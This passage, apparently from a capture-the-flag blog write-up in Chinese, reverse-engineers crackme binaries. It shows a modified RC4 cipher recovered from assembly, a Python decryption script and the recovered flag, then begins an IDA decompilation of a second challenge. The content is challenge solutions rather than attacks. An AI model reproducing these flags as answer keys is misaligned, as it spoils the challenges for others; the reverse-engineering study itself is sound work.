-48(%rbp)</span><br><span class="line">.LBB2_1:                                # =&gt;This Inner Loop Header: Depth=1</span><br><span class="line">        movq    -48(%rbp), %rax</span><br><span class="line">        cmpq    -32(%rbp), %rax</span><br><span class="line">        jae     .LBB2_4</span><br><span class="line"># %bb.2:                                #   in Loop: Header=BB2_1 Depth=1</span><br><span class="line">        movzbl  -33(%rbp), %eax</span><br><span class="line">        addl    $1, %eax</span><br><span class="line">        andl    $255, %eax</span><br><span class="line">                                        # kill: def $al killed $al killed $eax</span><br><span class="line">        movb    %al, -33(%rbp)</span><br><span class="line">        movzbl  -34(%rbp), %eax</span><br><span class="line">        movq    -8(%rbp), %rcx</span><br><span class="line">        movzbl  -33(%rbp), %edx</span><br><span class="line">                                        # kill: def $rdx killed $edx</span><br><span class="line">        movzbl  (%rcx,%rdx), %ecx</span><br><span class="line">        addl    %ecx, %eax</span><br><span class="line">        movzbl  -33(%rbp), %ecx</span><br><span class="line">        addl    %ecx, %eax</span><br><span class="line">        andl    $255, %eax</span><br><span class="line">                                        # kill: def $al killed $al killed $eax</span><br><span class="line">        movb    %al, -34(%rbp)</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movzbl  -33(%rbp), %ecx</span><br><span class="line">                                        # kill: def $rcx killed $ecx</span><br><span class="line">        movb    (%rax,%rcx), %al</span><br><span class="line">        movb    %al, -49(%rbp)</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movzbl  -34(%rbp), %ecx</span><br><span class="line">                                        # kill: def $rcx killed $ecx</span><br><span class="line">        movb    (%rax,%rcx), %dl</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movzbl  -33(%rbp), %ecx</span><br><span class="line">                                        # kill: def $rcx killed $ecx</span><br><span class="line">        movb    %dl, (%rax,%rcx)</span><br><span class="line">        movb    -49(%rbp), %dl</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movzbl  -34(%rbp), %ecx</span><br><span class="line">                                        # kill: def $rcx killed $ecx</span><br><span class="line">        movb    %dl, (%rax,%rcx)</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movq    -8(%rbp), %rcx</span><br><span class="line">        movzbl  -33(%rbp), %edx</span><br><span class="line">                                        # kill: def $rdx killed $edx</span><br><span class="line">        movzbl  (%rcx,%rdx), %ecx</span><br><span class="line">        movq    -8(%rbp), %rdx</span><br><span class="line">        movzbl  -34(%rbp), %esi</span><br><span class="line">                                        # kill: def $rsi killed $esi</span><br><span class="line">        movzbl  (%rdx,%rsi), %edx</span><br><span class="line">        addl    %edx, %ecx</span><br><span class="line">        andl    $255, %ecx</span><br><span class="line">        movslq  %ecx, %rcx</span><br><span class="line">        movzbl  (%rax,%rcx), %eax</span><br><span class="line">        movzbl  -33(%rbp), %ecx</span><br><span class="line">        addl    %ecx, %eax</span><br><span class="line">        andl    $255, %eax</span><br><span class="line">                                        # kill: def $al killed $al killed $eax</span><br><span class="line">        movb    %al, -50(%rbp)</span><br><span class="line">        movq    -8(%rbp), %rax</span><br><span class="line">        movzbl  -50(%rbp), %ecx</span><br><span class="line">                                        # kill: def $rcx killed $ecx</span><br><span class="line">        movb    (%rax,%rcx), %al</span><br><span class="line">        movb    %al, -51(%rbp)</span><br><span class="line">        movq    -16(%rbp), %rax</span><br><span class="line">        movq    -48(%rbp), %rcx</span><br><span class="line">        movzbl  (%rax,%rcx), %eax</span><br><span class="line">        movzbl  -51(%rbp), %ecx</span><br><span class="line">        xorl    %ecx, %eax</span><br><span class="line">        movb    %al, %dl</span><br><span class="line">        movq    -24(%rbp), %rax</span><br><span class="line">        movq    -48(%rbp), %rcx</span><br><span class="line">        movb    %dl, (%rax,%rcx)</span><br><span class="line"># %bb.3:                                #   in Loop: Header=BB2_1 Depth=1</span><br><span class="line">        movq    -48(%rbp), %rax</span><br><span class="line">        addq    $1, %rax</span><br><span class="line">        movq    %rax, -48(%rbp)</span><br><span class="line">        jmp     .LBB2_1</span><br><span class="line">.LBB2_4:</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa %rsp, 8</span><br><span class="line">        retq</span><br><span class="line">.Lfunc_end2:</span><br><span class="line">        .size   sub_1a4c, .Lfunc_end2-sub_1a4c</span><br><span class="line">        .cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">        .type   .L.str,@object                  # @.str</span><br><span class="line">        .section        .rodata.str1.1,&quot;aMS&quot;,@progbits,1</span><br><span class="line">.L.str:</span><br><span class="line">        .asciz  &quot;malloc failed\n&quot;</span><br><span class="line">        .size   .L.str, 15</span><br><span class="line"></span><br><span class="line">        .type   .L.str.1,@object                # @.str.1</span><br><span class="line">.L.str.1:</span><br><span class="line">        .asciz  &quot;realloc failed\n&quot;</span><br><span class="line">        .size   .L.str.1, 16</span><br><span class="line"></span><br><span class="line">        .type   sub_138,@object                 # @sub_138</span><br><span class="line">        .section        .rodata,&quot;a&quot;,@progbits</span><br><span class="line">sub_138:</span><br><span class="line">        .ascii  &quot;flag&#123;fake&#125;&quot;</span><br><span class="line">        .size   sub_138, 10</span><br><span class="line"></span><br><span class="line">        .type   sub_b361,@object                # @sub_b361</span><br><span class="line">        .p2align        4, 0x0</span><br><span class="line">sub_b361:</span><br><span class="line">        .ascii  &quot;ab#_var1an&amp;_k3y_f0r_???&quot;</span><br><span class="line">        .size   sub_b361, 23</span><br><span class="line"></span><br><span class="line">        .type   .L.str.2,@object                # @.str.2</span><br><span class="line">        .section        .rodata.str1.1,&quot;aMS&quot;,@progbits,1</span><br><span class="line">.L.str.2:</span><br><span class="line">        .asciz  &quot;Incorrect! (length mismatch)\n&quot;</span><br><span class="line">        .size   .L.str.2, 30</span><br><span class="line"></span><br><span class="line">        .type   sub_584c,@object                # @sub_584c</span><br><span class="line">        .section        .rodata,&quot;a&quot;,@progbits</span><br><span class="line">        .p2align        4, 0x0</span><br><span class="line">sub_584c:</span><br><span class="line">        .ascii  &quot;\302\366\277\251\232\276$\334h\f\364`\327\372\312,X\3128\b\211/@$]\207\227\222\242[\372\201\272Y\200p\266d\202S\021]&quot;</span><br><span class="line">        .size   sub_584c, 42</span><br><span class="line"></span><br><span class="line">        .type   .L.str.3,@object                # @.str.3</span><br><span class="line">        .section        .rodata.str1.1,&quot;aMS&quot;,@progbits,1</span><br><span class="line">.L.str.3:</span><br><span class="line">        .asciz  &quot;Correct!\n&quot;</span><br><span class="line">        .size   .L.str.3, 10</span><br><span class="line"></span><br><span class="line">        .type   .L.str.4,@object                # @.str.4</span><br><span class="line">.L.str.4:</span><br><span class="line">        .asciz  &quot;Incorrect!\n&quot;</span><br><span class="line">        .size   .L.str.4, 12</span><br><span class="line"></span><br><span class="line">        .ident  &quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;</span><br><span class="line">        .section        &quot;.note.GNU-stack&quot;,&quot;&quot;,@progbits</span><br><span class="line">        .addrsig</span><br><span class="line">        .addrsig_sym malloc</span><br><span class="line">        .addrsig_sym fprintf</span><br><span class="line">        .addrsig_sym getchar</span><br><span class="line">        .addrsig_sym realloc</span><br><span class="line">        .addrsig_sym free</span><br><span class="line">        .addrsig_sym sub_2a4c</span><br><span class="line">        .addrsig_sym sub_1a4c</span><br><span class="line">        .addrsig_sym printf</span><br><span class="line">        .addrsig_sym memcmp</span><br><span class="line">        .addrsig_sym stderr</span><br><span class="line">        .addrsig_sym sub_138</span><br><span class="line">        .addrsig_sym sub_b361</span><br><span class="line">        .addrsig_sym sub_584c</span><br></pre></td></tr></table></figure>
<p>flag{fake}+真正的flag=plaintext</p>
<p>用魔改RC4加密plaintext：</p>
<p>1.KSA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="comment"># 1. 非常规的密钥字节访问</span></span><br><span class="line">    key_index = (i * <span class="number">5</span> + <span class="number">3</span>) % key_len  <span class="comment"># 不是简单的 i % key_len</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 标准j计算</span></span><br><span class="line">    j = (j + S[i] + key[key_index]) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 标准交换</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 额外的j更新 (魔改!)</span></span><br><span class="line">    j = (j + i) &amp; <span class="number">0xFF</span>  <span class="comment"># 交换后再次修改j</span></span><br></pre></td></tr></table></figure>
<p>2.PGRA:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 每个字节:</span><br><span class="line">    <span class="comment"># 1. 标准i更新</span></span><br><span class="line">    i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 魔改的j更新</span></span><br><span class="line">    j = (j + S[i] + i) &amp; <span class="number">0xFF</span>  <span class="comment"># 额外加了 +i</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 标准交换</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 标准t计算</span></span><br><span class="line">    t = (S[i] + S[j]) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. 魔改的索引计算</span></span><br><span class="line">    idx = (S[t] + i) &amp; <span class="number">0xFF</span>  <span class="comment"># 使用 S[t] + i 而不是 t</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 6. 密钥流字节</span></span><br><span class="line">    keystream = S[idx]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># @sub_584c密文</span></span><br><span class="line">    ciphertext = [</span><br><span class="line">        <span class="number">0xC2</span>, <span class="number">0xF6</span>, <span class="number">0xBF</span>, <span class="number">0xA9</span>, <span class="number">0x9A</span>, <span class="number">0xBE</span>, <span class="number">0x24</span>, <span class="number">0xDC</span>, <span class="number">0x68</span>, <span class="number">0x0C</span>, </span><br><span class="line">        <span class="number">0xF4</span>, <span class="number">0x60</span>, <span class="number">0xD7</span>, <span class="number">0xFA</span>, <span class="number">0xCA</span>, <span class="number">0x2C</span>, <span class="number">0x58</span>, <span class="number">0xCA</span>, <span class="number">0x38</span>, <span class="number">0x08</span>, </span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0x2F</span>, <span class="number">0x40</span>, <span class="number">0x24</span>, <span class="number">0x5D</span>, <span class="number">0x87</span>, <span class="number">0x97</span>, <span class="number">0x92</span>, <span class="number">0xA2</span>, <span class="number">0x5B</span>, </span><br><span class="line">        <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0xBA</span>, <span class="number">0x59</span>, <span class="number">0x80</span>, <span class="number">0x70</span>, <span class="number">0xB6</span>, <span class="number">0x64</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x5D</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密钥: @sub_b361</span></span><br><span class="line">    key_str = <span class="string">&quot;ab#_var1an&amp;_k3y_f0r_???&quot;</span></span><br><span class="line">    key = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key_str]</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. KSA 初始化 (sub_2a4c)</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        k_idx = (i * <span class="number">5</span> + <span class="number">3</span>) % key_len</span><br><span class="line">        </span><br><span class="line">        j = (j + S[i] + key[k_idx]) &amp; <span class="number">0xFF</span></span><br><span class="line">        </span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        </span><br><span class="line">        j = (j + i) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. PRGA 解密 (sub_1a4c)</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    plaintext = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> char_code <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        </span><br><span class="line">        j = (j + S[i] + i) &amp; <span class="number">0xFF</span></span><br><span class="line">        </span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        </span><br><span class="line">        t = (S[i] + S[j]) &amp; <span class="number">0xFF</span></span><br><span class="line">        </span><br><span class="line">        idx = (S[t] + i) &amp; <span class="number">0xFF</span></span><br><span class="line">        </span><br><span class="line">        keystream_byte = S[idx]</span><br><span class="line">        </span><br><span class="line">        plaintext.append(char_code ^ keystream_byte)</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">bytes</span>(plaintext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{Thi3_i3_7he_s0_c@11ed_abcd}</strong></p>
<ul>
<li>eert</li>
</ul>
<blockquote>
<p>Start investigating data structures</p>
</blockquote>
<p>ida打开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **envp_1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **envp_2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+7h] [rbp-A9h] BYREF</span></span><br><span class="line">  TreeNode *v11; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  _QWORD p__Z4tmp1B5cxx11[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-A0h] BYREF</span></span><br><span class="line">  _QWORD v13[<span class="number">15</span>]; <span class="comment">// [rsp+30h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">13</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;input the flag:&quot;</span>, envp);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v13);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v10);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(p__Z4tmp1B5cxx11, v13, &amp;v10);</span><br><span class="line">  v11 = (TreeNode *)buildTree(p__Z4tmp1B5cxx11);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(p__Z4tmp1B5cxx11);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v10);</span><br><span class="line">  preorder(v11);</span><br><span class="line">  inorder(v11);</span><br><span class="line">  encrypt((__int64)p__Z4tmp1B5cxx11, &amp;tmp1[abi:cxx11], <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;tmp1[abi:cxx11], p__Z4tmp1B5cxx11);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(p__Z4tmp1B5cxx11);</span><br><span class="line">  encrypt((__int64)p__Z4tmp1B5cxx11, &amp;tmp2[abi:cxx11], <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;tmp2[abi:cxx11], p__Z4tmp1B5cxx11);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(p__Z4tmp1B5cxx11);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">std</span>::operator!=&lt;<span class="type">char</span>&gt;(&amp;tmp1[abi:cxx11], &amp;ans1[abi:cxx11])</span><br><span class="line">    || (<span class="type">unsigned</span> __int8)<span class="built_in">std</span>::operator!=&lt;<span class="type">char</span>&gt;(&amp;tmp2[abi:cxx11], &amp;ans2[abi:cxx11]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;wrong flag&quot;</span>, envp_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;right flag&quot;</span>, envp_1);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    v6 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Please wrap your answer with &#x27;flag&#123;&#125;&#x27;&quot;</span>, envp_2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>encrypt:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">encrypt</span><span class="params">(_QWORD *p__Z4tmp1B5cxx11, <span class="type">void</span> *p__Z4tmp1B5cxx11_1, <span class="type">char</span> n7)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+26h] [rbp-4Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+27h] [rbp-49h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-48h] BYREF</span></span><br><span class="line">  _QWORD v8[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">24</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">vector</span>(v9);</span><br><span class="line">  v8[<span class="number">1</span>] = p__Z4tmp1B5cxx11_1;</span><br><span class="line">  v7 = <span class="built_in">std</span>::<span class="built_in">string</span>::begin(p__Z4tmp1B5cxx11_1);</span><br><span class="line">  v8[<span class="number">0</span>] = <span class="built_in">std</span>::<span class="built_in">string</span>::end(p__Z4tmp1B5cxx11_1);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int8)__gnu_cxx::operator!=&lt;<span class="type">char</span> <span class="type">const</span>*,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(&amp;v7, v8) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_BYTE *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> <span class="type">const</span>*,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::operator*(&amp;v7);</span><br><span class="line">    v5 = n7 ^ v6;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::push_back(v9, &amp;v5);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> <span class="type">const</span>*,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::operator++(&amp;v7);</span><br><span class="line">  &#125;</span><br><span class="line">  base64_encode_custom[abi:cxx11](p__Z4tmp1B5cxx11, v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::~<span class="built_in">vector</span>(v9);</span><br><span class="line">  <span class="keyword">return</span> p__Z4tmp1B5cxx11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>buildtree:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">buildTree</span><span class="params">(<span class="type">void</span> *p__Z4tmp1B5cxx11)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  TreeNode *v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+1Fh] [rbp-61h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> i_2; <span class="comment">// [rsp+24h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> i_1; <span class="comment">// [rsp+2Ch] [rbp-54h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-48h] BYREF</span></span><br><span class="line">  _QWORD v12[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  _QWORD v13[<span class="number">5</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">3</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">string</span>::empty(p__Z4tmp1B5cxx11) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::<span class="built_in">vector</span>(v13);</span><br><span class="line">  v12[<span class="number">1</span>] = p__Z4tmp1B5cxx11;</span><br><span class="line">  v10 = <span class="built_in">std</span>::<span class="built_in">string</span>::begin(p__Z4tmp1B5cxx11);</span><br><span class="line">  v11 = <span class="built_in">std</span>::<span class="built_in">string</span>::end(p__Z4tmp1B5cxx11);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int8)__gnu_cxx::operator!=&lt;<span class="type">char</span> <span class="type">const</span>*,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(&amp;v10, &amp;v11) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_BYTE *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> <span class="type">const</span>*,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::operator*(&amp;v10);</span><br><span class="line">    v2 = (TreeNode *)operator new(<span class="number">0x18u</span>);</span><br><span class="line">    TreeNode::TreeNode(v2, v6);</span><br><span class="line">    v12[<span class="number">0</span>] = 